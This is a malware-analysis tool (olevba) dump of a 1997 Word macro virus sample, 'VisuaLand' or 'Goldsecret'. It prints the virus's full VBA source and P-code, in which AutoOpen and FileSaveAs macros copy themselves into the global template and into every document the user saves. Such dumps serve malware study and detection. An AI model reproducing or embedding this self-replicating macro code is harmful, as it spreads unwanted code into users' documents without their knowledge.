olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Goldsecret
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Goldsecret - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Goldsecret - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Concept)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsft Corporation
'   Copyright: (C) 1997 VisuaLand Technolgy
'   Utilities: VLWVG - VisuaLand Word Virus Generator 1.00
'              Created by Milky Wahyudi Widjaya (PresDir VL
' Last Update: 01-01-1997
'   VL Office: Visualand Technology (VISUALAND-DOM)
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'  Dedication: - McNamara (Concept was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
Dim bTooMuchTrouble
Dim bTooMuchError
Dim Mikrodata
Dim sMe$
Dim sMacro$

    iMacroCount = WordBasic.CountMacros(0, 0)

    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "VisuaLand" Then
            bInstalled = -1
        End If
        If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
            bTooMuchTrouble = -1
        End If
        If WordBasic.[MacroName$](i, 0, 0) = "AutoOpen" Then
            bTooMuchError = -1
        End If
    Next i

    If Not bInstalled And Not bTooMuchTrouble And Not bTooMuchError Then

    WordBasic.ToolsCustomizeMenus MenuType:=0, Position:=13, Category:=2, Name:="VisuaLand", Menu:="&Help", AddBelow:="&About Microsoft Word...", MenuText:="About &VisuaLand Technology GoldSecret...", Add:=1, Context:=0

        Mikrodata = WordBasic.Val(WordBasic.[GetDocumentVar$]("Mikrodata"))
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":VisuaLand"
        WordBasic.MacroCopy sMacro$, "Global:VisuaLand", 1
        sMacro$ = sMe$ + ":FileSaveAs"
        WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", 1
        sMacro$ = sMe$ + ":AutoOpen"
        WordBasic.MacroCopy sMacro$, "Global:AutoOpen", 1
        WordBasic.SetProfileString "MD97", Str(Mikrodata + 1)
        WordBasic.MsgBox "The Full Powered by VisuLand Technology"
    End If

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Goldsecret - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Concept)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsft Corporation
'   Copyright: (C) 1997 VisuaLand Technolgy
'   Utilities: VLWVG - VisuaLand Word Virus Generator 1.00
'              Created by Milky Wahyudi Widjaya (PresDir VL
' Last Update: 01-01-1997
'   VL Office: Visualand Technology (VISUALAND-DOM)
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'  Dedication: - McNamara (Concept was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim sMe$
Dim sTMacro$

    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo Abort
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg

    If dlg.Format = 0 Then dlg.Format = 1
    sMe$ = WordBasic.[FileName$]()

    sTMacro$ = sMe$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", sTMacro$, 1
    sTMacro$ = sMe$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$, 1
    sTMacro$ = sMe$ + ":VisuaLand"
    WordBasic.MacroCopy "Global:VisuaLand", sTMacro$, 1
    WordBasic.FileSaveAs dlg
    GoTo Done

Abort:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VisuaLand.bas 
in file: ./Virus.MSWord.Goldsecret - OLE stream: 'Macros/VBA/VisuaLand'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'----------------------------------------------------------------
'       Virus: VisuaLand.WinWord
'      Author: Milky Wahyudi Widjaya
'     VRating: Make First WordMacro.virii (Concept)
'    Compiler: WordMacro in ToolsMacro
'              (C) 1983-1994 Microsft Corporation
'   Copyright: (C) 1997 VisuaLand Technolgy
'   Utilities: VLWVG - VisuaLand Word Virus Generator 1.00
'              Created by Milky Wahyudi Widjaya (PresDir VL
' Last Update: 01-01-1997
'   VL Office: Visualand Technology (VISUALAND-DOM)
'              Jl. H. Marzuki No.37, RT 06/03
'              Jakarta, 11530
'              Indonesia
'  Dedication: - McNamara (Concept was created by you???)
'              - Eko Sulistiono (MD)
'              - All VirMarker in the World
'     Thank's: God
'-----------------------------------------------------------------

Public Sub MAIN()

WordBasic.BeginDialog 588, 338, "About VisuaLand Technology..."
    WordBasic.PushButton 152, 299, 301, 21, "Milky Wahyudi Widjaya - VisuaLand", "Push1"
    WordBasic.Text 16, 199, 554, 13, "OK,  Concept  was  updated,  please  look  VisuaLand.Winword.  I  hope", "Text18"
    WordBasic.Text 16, 218, 560, 13, "you easy study again, because VisuaLand is the best virii in 1997. If you have", "Text19"
    WordBasic.Text 16, 237, 553, 13, "have any comment, please email to me: visualand@visualand.com, bye...", "Text20"
    WordBasic.Text 16, 256, 35, 1, "", "Text21"
    WordBasic.Text 16, 263, 268, 1, "", "Text22"
    WordBasic.Text 13, 270, 559, 13, "VisuaLand Technology CyberWorld WebSite in http://www.visualand.com", "Text24"
    WordBasic.Text 16, 282, 559, 1, "", "Text23"
    WordBasic.Text 133, 16, 357, 13, "Welcome to VisuaLand Technology GoldSecret", "Text1"
    WordBasic.Text 169, 35, 357, 1, "", "Text2"
    WordBasic.Text 19, 43, 548, 13, "VisuaLand Technology is a member in Internet, about research && creator", "Text4"
    WordBasic.Text 19, 62, 557, 13, "virii. We are the first creator virii (Document MS-Word). Concept virii,  is ", "Text7"
    WordBasic.Text 19, 81, 559, 13, "the my research. Concept is not wild, but Concept only for tutorial,  how ", "Text8"
    WordBasic.Text 19, 100, 555, 13, "to create some virii in Microsoft Word. It's illegal to use baby...", "Text9"
    WordBasic.Text 19, 119, 35, 1, "", "Text10"
    WordBasic.Text 19, 126, 35, 1, "", "Text12"
    WordBasic.Text 19, 133, 35, 1, "", "Text13"
    WordBasic.Text 19, 140, 35, 1, "", "Text14"
    WordBasic.Text 19, 138, 35, 1, "", "Text11"
    WordBasic.Text 45, 61, 35, 1, "", "Text6"
    WordBasic.Text 45, 61, 35, 1, "", "Text5"
    WordBasic.Text 169, 54, 35, 1, "", "Text3"
    WordBasic.Text 17, 129, 562, 13, "Some people said that first WordMacro virus was created by  McNamara, ", "Text15"
    WordBasic.Text 17, 148, 565, 13, "but it's bullshit. Concept was created by Milky Wahyudi Widjaya (PresDir", "Text16"
    WordBasic.Text 17, 167, 569, 13, "of VisuaLand Technology). from Jakarta - Indonesia. It's my GoldSecret!", "Text17"
WordBasic.EndDialog

Dim VisuaLand As Object: Set VisuaLand = WordBasic.CurValues.UserDialog
WordBasic.Dialog.UserDialog VisuaLand

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Goldsecret
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 4735 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0040 "----------------------------------------------------------------"
' Line #2:
' 	QuoteRem 0x0000 0x001F "       Virus: VisuaLand.WinWord"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "      Author: Milky Wahyudi Widjaya"
' Line #4:
' 	QuoteRem 0x0000 0x0032 "     VRating: Make First WordMacro.virii (Concept)"
' Line #5:
' 	QuoteRem 0x0000 0x0025 "    Compiler: WordMacro in ToolsMacro"
' Line #6:
' 	QuoteRem 0x0000 0x0030 "              (C) 1983-1994 Microsft Corporation"
' Line #7:
' 	QuoteRem 0x0000 0x002A "   Copyright: (C) 1997 VisuaLand Technolgy"
' Line #8:
' 	QuoteRem 0x0000 0x0039 "   Utilities: VLWVG - VisuaLand Word Virus Generator 1.00"
' Line #9:
' 	QuoteRem 0x0000 0x003A "              Created by Milky Wahyudi Widjaya (PresDir VL"
' Line #10:
' 	QuoteRem 0x0000 0x0018 " Last Update: 01-01-1997"
' Line #11:
' 	QuoteRem 0x0000 0x0032 "   VL Office: Visualand Technology (VISUALAND-DOM)"
' Line #12:
' 	QuoteRem 0x0000 0x002C "              Jl. H. Marzuki No.37, RT 06/03"
' Line #13:
' 	QuoteRem 0x0000 0x001C "              Jakarta, 11530"
' Line #14:
' 	QuoteRem 0x0000 0x0017 "              Indonesia"
' Line #15:
' 	QuoteRem 0x0000 0x0038 "  Dedication: - McNamara (Concept was created by you???)"
' Line #16:
' 	QuoteRem 0x0000 0x0023 "              - Eko Sulistiono (MD)"
' Line #17:
' 	QuoteRem 0x0000 0x002A "              - All VirMarker in the World"
' Line #18:
' 	QuoteRem 0x0000 0x0011 "     Thank's: God"
' Line #19:
' 	QuoteRem 0x0000 0x0041 "-----------------------------------------------------------------"
' Line #20:
' Line #21:
' 	FuncDefn (Public Sub MAIN())
' Line #22:
' 	Dim 
' 	VarDefn iMacroCount
' Line #23:
' 	Dim 
' 	VarDefn i
' Line #24:
' 	Dim 
' 	VarDefn bInstalled
' Line #25:
' 	Dim 
' 	VarDefn bTooMuchTrouble
' Line #26:
' 	Dim 
' 	VarDefn bTooMuchError
' Line #27:
' 	Dim 
' 	VarDefn Mikrodata
' Line #28:
' 	Dim 
' 	VarDefn sMe
' Line #29:
' 	Dim 
' 	VarDefn sMacro
' Line #30:
' Line #31:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #32:
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #34:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "VisuaLand"
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bInstalled 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x000A "FileSaveAs"
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bTooMuchTrouble 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	IfBlock 
' Line #41:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bTooMuchError 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' Line #45:
' 	Ld bInstalled 
' 	Not 
' 	Ld bTooMuchTrouble 
' 	Not 
' 	And 
' 	Ld bTooMuchError 
' 	Not 
' 	And 
' 	IfBlock 
' Line #46:
' Line #47:
' 	LitDI2 0x0000 
' 	ParamNamed MenuType 
' 	LitDI2 0x000D 
' 	ParamNamed Position 
' 	LitDI2 0x0002 
' 	ParamNamed Category 
' 	LitStr 0x0009 "VisuaLand"
' 	ParamNamed New 
' 	LitStr 0x0005 "&Help"
' 	ParamNamed Menu 
' 	LitStr 0x0018 "&About Microsoft Word..."
' 	ParamNamed AddBelow 
' 	LitStr 0x0029 "About &VisuaLand Technology GoldSecret..."
' 	ParamNamed MenuText 
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	LitDI2 0x0000 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeMenus 0x0009 
' Line #48:
' Line #49:
' 	LitStr 0x0009 "Mikrodata"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	St Mikrodata 
' Line #50:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #51:
' 	Ld sMe$ 
' 	LitStr 0x000A ":VisuaLand"
' 	Add 
' 	St sMacro$ 
' Line #52:
' 	Ld sMacro$ 
' 	LitStr 0x0010 "Global:VisuaLand"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #53:
' 	Ld sMe$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St sMacro$ 
' Line #54:
' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #55:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #56:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #57:
' 	LitStr 0x0004 "MD97"
' 	Ld Mikrodata 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0002 
' Line #58:
' 	LitStr 0x0027 "The Full Powered by VisuLand Technology"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #59:
' 	EndIfBlock 
' Line #60:
' Line #61:
' 	Label Abort 
' Line #62:
' 	EndSub 
' Macros/VBA/FileSaveAs - 3903 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0040 "----------------------------------------------------------------"
' Line #2:
' 	QuoteRem 0x0000 0x001F "       Virus: VisuaLand.WinWord"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "      Author: Milky Wahyudi Widjaya"
' Line #4:
' 	QuoteRem 0x0000 0x0032 "     VRating: Make First WordMacro.virii (Concept)"
' Line #5:
' 	QuoteRem 0x0000 0x0025 "    Compiler: WordMacro in ToolsMacro"
' Line #6:
' 	QuoteRem 0x0000 0x0030 "              (C) 1983-1994 Microsft Corporation"
' Line #7:
' 	QuoteRem 0x0000 0x002A "   Copyright: (C) 1997 VisuaLand Technolgy"
' Line #8:
' 	QuoteRem 0x0000 0x0039 "   Utilities: VLWVG - VisuaLand Word Virus Generator 1.00"
' Line #9:
' 	QuoteRem 0x0000 0x003A "              Created by Milky Wahyudi Widjaya (PresDir VL"
' Line #10:
' 	QuoteRem 0x0000 0x0018 " Last Update: 01-01-1997"
' Line #11:
' 	QuoteRem 0x0000 0x0032 "   VL Office: Visualand Technology (VISUALAND-DOM)"
' Line #12:
' 	QuoteRem 0x0000 0x002C "              Jl. H. Marzuki No.37, RT 06/03"
' Line #13:
' 	QuoteRem 0x0000 0x001C "              Jakarta, 11530"
' Line #14:
' 	QuoteRem 0x0000 0x0017 "              Indonesia"
' Line #15:
' 	QuoteRem 0x0000 0x0038 "  Dedication: - McNamara (Concept was created by you???)"
' Line #16:
' 	QuoteRem 0x0000 0x0023 "              - Eko Sulistiono (MD)"
' Line #17:
' 	QuoteRem 0x0000 0x002A "              - All VirMarker in the World"
' Line #18:
' 	QuoteRem 0x0000 0x0011 "     Thank's: God"
' Line #19:
' 	QuoteRem 0x0000 0x0041 "-----------------------------------------------------------------"
' Line #20:
' Line #21:
' 	FuncDefn (Public Sub MAIN())
' Line #22:
' 	Dim 
' 	VarDefn sMe
' Line #23:
' 	Dim 
' 	VarDefn sTMacro
' Line #24:
' Line #25:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #26:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #28:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #29:
' Line #30:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #32:
' Line #33:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #34:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld sTMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #35:
' 	Ld sMe$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St sTMacro$ 
' Line #36:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld sTMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #37:
' 	Ld sMe$ 
' 	LitStr 0x000A ":VisuaLand"
' 	Add 
' 	St sTMacro$ 
' Line #38:
' 	LitStr 0x0010 "Global:VisuaLand"
' 	Ld sTMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #39:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #40:
' 	GoTo Done 
' Line #41:
' Line #42:
' 	Label Abort 
' Line #43:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #44:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Label Done 
' Line #47:
' 	EndSub 
' Macros/VBA/VisuaLand - 6019 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0040 "----------------------------------------------------------------"
' Line #2:
' 	QuoteRem 0x0000 0x001F "       Virus: VisuaLand.WinWord"
' Line #3:
' 	QuoteRem 0x0000 0x0023 "      Author: Milky Wahyudi Widjaya"
' Line #4:
' 	QuoteRem 0x0000 0x0032 "     VRating: Make First WordMacro.virii (Concept)"
' Line #5:
' 	QuoteRem 0x0000 0x0025 "    Compiler: WordMacro in ToolsMacro"
' Line #6:
' 	QuoteRem 0x0000 0x0030 "              (C) 1983-1994 Microsft Corporation"
' Line #7:
' 	QuoteRem 0x0000 0x002A "   Copyright: (C) 1997 VisuaLand Technolgy"
' Line #8:
' 	QuoteRem 0x0000 0x0039 "   Utilities: VLWVG - VisuaLand Word Virus Generator 1.00"
' Line #9:
' 	QuoteRem 0x0000 0x003A "              Created by Milky Wahyudi Widjaya (PresDir VL"
' Line #10:
' 	QuoteRem 0x0000 0x0018 " Last Update: 01-01-1997"
' Line #11:
' 	QuoteRem 0x0000 0x0032 "   VL Office: Visualand Technology (VISUALAND-DOM)"
' Line #12:
' 	QuoteRem 0x0000 0x002C "              Jl. H. Marzuki No.37, RT 06/03"
' Line #13:
' 	QuoteRem 0x0000 0x001C "              Jakarta, 11530"
' Line #14:
' 	QuoteRem 0x0000 0x0017 "              Indonesia"
' Line #15:
' 	QuoteRem 0x0000 0x0038 "  Dedication: - McNamara (Concept was created by you???)"
' Line #16:
' 	QuoteRem 0x0000 0x0023 "              - Eko Sulistiono (MD)"
' Line #17:
' 	QuoteRem 0x0000 0x002A "              - All VirMarker in the World"
' Line #18:
' 	QuoteRem 0x0000 0x0011 "     Thank's: God"
' Line #19:
' 	QuoteRem 0x0000 0x0041 "-----------------------------------------------------------------"
' Line #20:
' Line #21:
' 	FuncDefn (Public Sub MAIN())
' Line #22:
' Line #23:
' 	LitDI2 0x024C 
' 	LitDI2 0x0152 
' 	LitStr 0x001D "About VisuaLand Technology..."
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #24:
' 	LitDI2 0x0098 
' 	LitDI2 0x012B 
' 	LitDI2 0x012D 
' 	LitDI2 0x0015 
' 	LitStr 0x0021 "Milky Wahyudi Widjaya - VisuaLand"
' 	LitStr 0x0005 "Push1"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #25:
' 	LitDI2 0x0010 
' 	LitDI2 0x00C7 
' 	LitDI2 0x022A 
' 	LitDI2 0x000D 
' 	LitStr 0x0046 "OK,  Concept  was  updated,  please  look  VisuaLand.Winword.  I  hope"
' 	LitStr 0x0006 "Text18"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #26:
' 	LitDI2 0x0010 
' 	LitDI2 0x00DA 
' 	LitDI2 0x0230 
' 	LitDI2 0x000D 
' 	LitStr 0x004E "you easy study again, because VisuaLand is the best virii in 1997. If you have"
' 	LitStr 0x0006 "Text19"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #27:
' 	LitDI2 0x0010 
' 	LitDI2 0x00ED 
' 	LitDI2 0x0229 
' 	LitDI2 0x000D 
' 	LitStr 0x0045 "have any comment, please email to me: visualand@visualand.com, bye..."
' 	LitStr 0x0006 "Text20"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #28:
' 	LitDI2 0x0010 
' 	LitDI2 0x0100 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0006 "Text21"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #29:
' 	LitDI2 0x0010 
' 	LitDI2 0x0107 
' 	LitDI2 0x010C 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0006 "Text22"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #30:
' 	LitDI2 0x000D 
' 	LitDI2 0x010E 
' 	LitDI2 0x022F 
' 	LitDI2 0x000D 
' 	LitStr 0x0043 "VisuaLand Technology CyberWorld WebSite in http://www.visualand.com"
' 	LitStr 0x0006 "Text24"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #31:
' 	LitDI2 0x0010 
' 	LitDI2 0x011A 
' 	LitDI2 0x022F 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0006 "Text23"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #32:
' 	LitDI2 0x0085 
' 	LitDI2 0x0010 
' 	LitDI2 0x0165 
' 	LitDI2 0x000D 
' 	LitStr 0x002A "Welcome to VisuaLand Technology GoldSecret"
' 	LitStr 0x0005 "Text1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #33:
' 	LitDI2 0x00A9 
' 	LitDI2 0x0023 
' 	LitDI2 0x0165 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0005 "Text2"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #34:
' 	LitDI2 0x0013 
' 	LitDI2 0x002B 
' 	LitDI2 0x0224 
' 	LitDI2 0x000D 
' 	LitStr 0x0047 "VisuaLand Technology is a member in Internet, about research && creator"
' 	LitStr 0x0005 "Text4"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #35:
' 	LitDI2 0x0013 
' 	LitDI2 0x003E 
' 	LitDI2 0x022D 
' 	LitDI2 0x000D 
' 	LitStr 0x004D "virii. We are the first creator virii (Document MS-Word). Concept virii,  is "
' 	LitStr 0x0005 "Text7"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #36:
' 	LitDI2 0x0013 
' 	LitDI2 0x0051 
' 	LitDI2 0x022F 
' 	LitDI2 0x000D 
' 	LitStr 0x004A "the my research. Concept is not wild, but Concept only for tutorial,  how "
' 	LitStr 0x0005 "Text8"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #37:
' 	LitDI2 0x0013 
' 	LitDI2 0x0064 
' 	LitDI2 0x022B 
' 	LitDI2 0x000D 
' 	LitStr 0x0043 "to create some virii in Microsoft Word. It's illegal to use baby..."
' 	LitStr 0x0005 "Text9"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #38:
' 	LitDI2 0x0013 
' 	LitDI2 0x0077 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0006 "Text10"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #39:
' 	LitDI2 0x0013 
' 	LitDI2 0x007E 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0006 "Text12"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #40:
' 	LitDI2 0x0013 
' 	LitDI2 0x0085 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0006 "Text13"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #41:
' 	LitDI2 0x0013 
' 	LitDI2 0x008C 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0006 "Text14"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #42:
' 	LitDI2 0x0013 
' 	LitDI2 0x008A 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0006 "Text11"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #43:
' 	LitDI2 0x002D 
' 	LitDI2 0x003D 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0005 "Text6"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #44:
' 	LitDI2 0x002D 
' 	LitDI2 0x003D 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0005 "Text5"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #45:
' 	LitDI2 0x00A9 
' 	LitDI2 0x0036 
' 	LitDI2 0x0023 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0005 "Text3"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #46:
' 	LitDI2 0x0011 
' 	LitDI2 0x0081 
' 	LitDI2 0x0232 
' 	LitDI2 0x000D 
' 	LitStr 0x0046 "Some people said that first WordMacro virus was created by  McNamara, "
' 	LitStr 0x0006 "Text15"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #47:
' 	LitDI2 0x0011 
' 	LitDI2 0x0094 
' 	LitDI2 0x0235 
' 	LitDI2 0x000D 
' 	LitStr 0x0048 "but it's bullshit. Concept was created by Milky Wahyudi Widjaya (PresDir"
' 	LitStr 0x0006 "Text16"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #48:
' 	LitDI2 0x0011 
' 	LitDI2 0x00A7 
' 	LitDI2 0x0239 
' 	LitDI2 0x000D 
' 	LitStr 0x0047 "of VisuaLand Technology). from Jakarta - Indonesia. It's my GoldSecret!"
' 	LitStr 0x0006 "Text17"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #49:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #50:
' Line #51:
' 	Dim 
' 	VarDefn VisuaLand (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set VisuaLand 
' Line #52:
' 	Ld VisuaLand 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall UserDialog 0x0001 
' Line #53:
' Line #54:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
